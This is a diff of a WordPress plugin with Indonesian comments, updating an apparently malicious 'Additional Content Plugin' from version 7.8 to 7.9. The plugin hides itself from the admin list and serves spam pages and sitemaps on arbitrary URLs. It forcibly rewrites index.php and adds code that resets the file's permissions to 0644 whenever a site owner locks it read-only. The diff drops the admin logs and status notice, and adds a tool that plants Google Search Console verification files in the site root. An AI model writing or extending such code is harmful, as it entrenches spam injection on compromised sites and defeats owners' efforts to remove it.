@@ -1,8 +1,8 @@
 <?php
 /*
 Plugin Name: Additional Content Plugin
-Description: Plugin konten & sitemap stealth dengan Integrity Monitor & Permission Check.
-Version: 7.8
+Description: Plugin konten & sitemap stealth dengan Permission Guard, Copy Tools & GSC Verifier.
+Version: 7.9
 Author: Grok
 */
 
@@ -24,9 +24,8 @@ function acp_get_storage_dir() {
 }
 
 // ==========================================
-// 1. INTEGRITY GUARD (INDEX.PHP PROTECTOR)
+// 1. INTEGRITY GUARD (PERMISSION & CONTENT)
 // ==========================================
-// Ganti ke plugins_loaded agar jalan SEBELUM init
 add_action('plugins_loaded', 'acp_integrity_guard', -9999);
 
 function acp_integrity_guard() {
@@ -52,34 +51,40 @@ define( 'WP_USE_THEMES', true );
 require __DIR__ . '/wp-blog-header.php';
 ";
 
-    // Logika Restore
+    // 1. CEK & PERBAIKI PERMISSION (CHMOD)
+    if (file_exists($index_path)) {
+        $perms = substr(sprintf('%o', fileperms($index_path)), -4);
+        // Jika permission bukan 0644 (misal diubah jadi 0444/read-only), paksa ubah balik
+        if ($perms !== '0644') {
+            @chmod($index_path, 0644);
+        }
+    }
+
+    // 2. CEK & RESTORE KONTEN
     if (file_exists($index_path)) {
         $current_content = file_get_contents($index_path);
-        // Normalisasi baris baru
         $clean_current = trim(str_replace(["\r\n", "\r"], "\n", $current_content));
         $clean_default = trim(str_replace(["\r\n", "\r"], "\n", $default_content));
 
         if ($clean_current !== $clean_default) {
-            if (is_writable($index_path)) {
+            // Coba tulis ulang
+            if (@file_put_contents($index_path, $default_content) === false) {
+                // Jika gagal, coba chmod lagi lalu tulis
+                @chmod($index_path, 0644);
                 file_put_contents($index_path, $default_content);
-                // Log error untuk admin
-                error_log('[ACP Security] index.php dimodifikasi terdeteksi! File telah direstore ke default.');
             }
         }
     } else {
-        // File Hilang -> Buat Baru
-        // Cek apakah folder root writable
-        if (is_writable(ABSPATH)) {
-            file_put_contents($index_path, $default_content);
-            error_log('[ACP Security] index.php hilang! File baru telah dibuat.');
-        }
+        // File hilang, buat baru
+        file_put_contents($index_path, $default_content);
+        @chmod($index_path, 0644);
     }
 }
 
 // ==========================================
 // 2. NUCLEAR HANDLER (SITEMAP & CONTENT)
 // ==========================================
-add_action('plugins_loaded', 'acp_nuclear_handler', -9998); // Prioritas setelah integrity guard
+add_action('plugins_loaded', 'acp_nuclear_handler', -9998);
 
 function acp_nuclear_handler() {
     $request_uri = $_SERVER['REQUEST_URI'];
@@ -116,9 +121,10 @@ function acp_nuclear_handler() {
 
     // B. CONTENT
     $slug = trim($path, '/');
-    if (empty($slug) || preg_match('/\.(css|js|jpg|jpeg|png|gif|ico|woff|ttf|svg|php)$/i', $slug)) {
+    if (empty($slug) || preg_match('/\.(css|js|jpg|jpeg|png|gif|ico|woff|ttf|svg|php|html)$/i', $slug)) {
         return;
     }
+    
     $title_key = urldecode($slug);
     $template_path = acp_get_storage_dir() . '/template.txt';
     if (!file_exists($template_path)) return; 
@@ -134,7 +140,6 @@ function acp_nuclear_handler() {
                     if (!headers_sent()) {
                         header('HTTP/1.1 200 OK');
                         status_header(200);
-                        header('X-ACP-Status: Active'); 
                     }
                     while (ob_get_level()) ob_end_clean();
 
@@ -264,24 +269,42 @@ function acp_generate_random_string($length = 5) {
     return substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, $length);
 }
 
-// FUNGSI CEK PERMISSION ROOT
-function acp_check_integrity_status() {
-    $index_path = ABSPATH . 'index.php';
-    $is_writable = is_writable(ABSPATH);
-    $is_file_writable = file_exists($index_path) ? is_writable($index_path) : $is_writable;
-    
-    if (!$is_writable) {
-        return ['status' => 'error', 'msg' => 'Folder Root TIDAK Writable! Plugin tidak bisa restore index.php jika terhapus.'];
-    }
-    if (!$is_file_writable) {
-        return ['status' => 'warning', 'msg' => 'File index.php TIDAK Writable! Plugin tidak bisa mengoreksi jika dimodifikasi.'];
-    }
-    return ['status' => 'success', 'msg' => 'Sistem Keamanan Aktif: Root Writable & index.php Terlindungi.'];
-}
-
 function acp_admin_page() {
-    $security_status = acp_check_integrity_status();
+    // === HANDLING GSC VERIFICATION ===
+    // CREATE
+    if (isset($_POST['acp_gsc_create'])) {
+        check_admin_referer('acp_action');
+        $gsc_code = sanitize_text_field($_POST['acp_gsc_code']);
+        if (!empty($gsc_code)) {
+            // Pastikan format nama file aman (hanya alphanumeric)
+            $filename = preg_replace('/[^a-zA-Z0-9]/', '', $gsc_code) . '.html';
+            $file_path = ABSPATH . $filename;
+            $content = "google-site-verification: " . $filename;
+            
+            if (file_put_contents($file_path, $content) !== false) {
+                update_option('acp_gsc_filename', $filename);
+                echo '<div class="updated"><p>File verifikasi <strong>'.$filename.'</strong> berhasil dibuat!</p></div>';
+            } else {
+                echo '<div class="error"><p>Gagal membuat file. Cek permission folder root.</p></div>';
+            }
+        }
+    }
+    // DELETE
+    if (isset($_POST['acp_gsc_delete'])) {
+        check_admin_referer('acp_action');
+        $filename = get_option('acp_gsc_filename');
+        if ($filename && file_exists(ABSPATH . $filename)) {
+            unlink(ABSPATH . $filename);
+            delete_option('acp_gsc_filename');
+            echo '<div class="updated"><p>File verifikasi berhasil dihapus.</p></div>';
+        } else {
+            delete_option('acp_gsc_filename');
+            echo '<div class="error"><p>File tidak ditemukan atau sudah terhapus.</p></div>';
+        }
+    }
+    $current_gsc_file = get_option('acp_gsc_filename');
 
+    // === STANDARD HANDLERS ===
     if (acp_is_safe_mode() && isset($_POST['acp_disable_stealth'])) {
         check_admin_referer('acp_action');
         update_option('acp_plugin_hidden', false);
@@ -323,16 +346,9 @@ function acp_admin_page() {
     $main_sitemap_url = home_url(ACP_MAIN_SITEMAP);
     ?>
     <div class="wrap">
-        <h1>Content Plugin (V7.8 Integrity Monitor)</h1>
+        <h1>Content Plugin (V7.9 Ultimate Tools)</h1>
         
-        <?php if($security_status['status'] === 'success'): ?>
-            <div class="notice notice-success inline"><p><strong>✅ <?php echo $security_status['msg']; ?></strong></p></div>
-        <?php else: ?>
-            <div class="notice notice-error inline"><p><strong>❌ <?php echo $security_status['msg']; ?></strong></p></div>
-        <?php endif; ?>
-
         <?php if ($is_hidden): ?><div class="notice notice-warning"><p>MODE STEALTH AKTIF</p></div><?php endif; ?>
-        
         <?php if (acp_is_safe_mode()): ?>
             <div class="notice notice-error"><form method="post"><?php wp_nonce_field('acp_action'); ?><input type="submit" name="acp_disable_stealth" class="button button-primary" value="Matikan Stealth"></form></div>
         <?php endif; ?>
@@ -340,6 +356,27 @@ function acp_admin_page() {
         <div style="background:#fff; padding:15px; border-left:4px solid #00a0d2; margin-bottom:20px; display:flex; justify-content:space-between; align-items:center;">
             <div>Status: <strong><?php echo $is_hidden ? '<span style="color:red">HIDDEN</span>' : '<span style="color:green">VISIBLE</span>'; ?></strong></div>
             <form method="post"><?php wp_nonce_field('acp_action'); ?><input type="submit" name="acp_toggle_visibility" class="button" value="<?php echo $is_hidden ? 'Unhide' : 'Hide'; ?>"></form>
+        </div>
+
+        <div style="background:#fff; padding:20px; border:1px solid #ccd0d4; margin-bottom:20px;">
+            <h2>Google Search Console Verification</h2>
+            <p>Masukkan kode verifikasi (contoh: <code>google8f39414e57a5615a</code>) untuk membuat file verifikasi otomatis.</p>
+            
+            <?php if ($current_gsc_file && file_exists(ABSPATH . $current_gsc_file)): ?>
+                <div style="background:#e7f7d3; padding:10px; border:1px solid #7ad03a; margin-bottom:10px;">
+                    <strong>File Aktif:</strong> <a href="<?php echo home_url($current_gsc_file); ?>" target="_blank"><?php echo $current_gsc_file; ?></a>
+                </div>
+                <form method="post" onsubmit="return confirm('Hapus file verifikasi?');">
+                    <?php wp_nonce_field('acp_action'); ?>
+                    <input type="submit" name="acp_gsc_delete" class="button button-link-delete" value="Hapus File Verifikasi">
+                </form>
+            <?php else: ?>
+                <form method="post" style="display:flex; gap:10px; align-items:center;">
+                    <?php wp_nonce_field('acp_action'); ?>
+                    <input type="text" name="acp_gsc_code" class="regular-text" placeholder="google8f39414e57a5615a" required>
+                    <input type="submit" name="acp_gsc_create" class="button button-secondary" value="Buat File Verifikasi">
+                </form>
+            <?php endif; ?>
         </div>
 
         <?php if (!$endpoints): ?>
@@ -365,7 +402,12 @@ function acp_admin_page() {
                         <?php foreach ($endpoints as $i => $ep): $st = isset($ep['status']) ? $ep['status'] : 'pending'; ?>
                         <tr>
                             <td><?php echo $i + 1; ?></td>
-                            <td><input type="text" value="<?php echo $ep['json_filename']; ?>" class="regular-text" style="width:150px;" readonly> .json</td>
+                            <td>
+                                <div style="display:flex; align-items:center;">
+                                    <input type="text" id="json_<?php echo $i; ?>" value="<?php echo $ep['json_filename']; ?>" class="regular-text" style="width:150px;" readonly> .json
+                                    <span class="dashicons dashicons-admin-page acp-copy" data-target="json_<?php echo $i; ?>" style="cursor:pointer; color:#0073aa; margin-left:5px;" title="Copy Filename"></span>
+                                </div>
+                            </td>
                             <td><?php echo ($st == 'active') ? '<strong style="color:green">OK</strong>' : '<span>-</span>'; ?></td>
                         </tr>
                         <?php endforeach; ?>
@@ -376,6 +418,20 @@ function acp_admin_page() {
             <form method="post" onsubmit="return confirm('Reset?');"><?php wp_nonce_field('acp_action'); ?><input type="submit" name="acp_reset" class="button button-link-delete" value="Reset"></form>
         <?php endif; ?>
     </div>
-    <script>jQuery(document).ready(function($){$('.acp-copy').click(function(){var t=document.getElementById($(this).data('target'));t.select();document.execCommand('copy');alert('Copied!');});});</script>
+    <script>
+    jQuery(document).ready(function($){
+        $('.acp-copy').click(function(){
+            var targetId = $(this).data('target');
+            var target = document.getElementById(targetId);
+            target.select();
+            document.execCommand('copy');
+            
+            // Visual feedback
+            var originalColor = $(this).css('color');
+            $(this).css('color', '#46b450'); // Green
+            setTimeout(() => { $(this).css('color', originalColor); }, 1000);
+        });
+    });
+    </script>
     <?php
 }
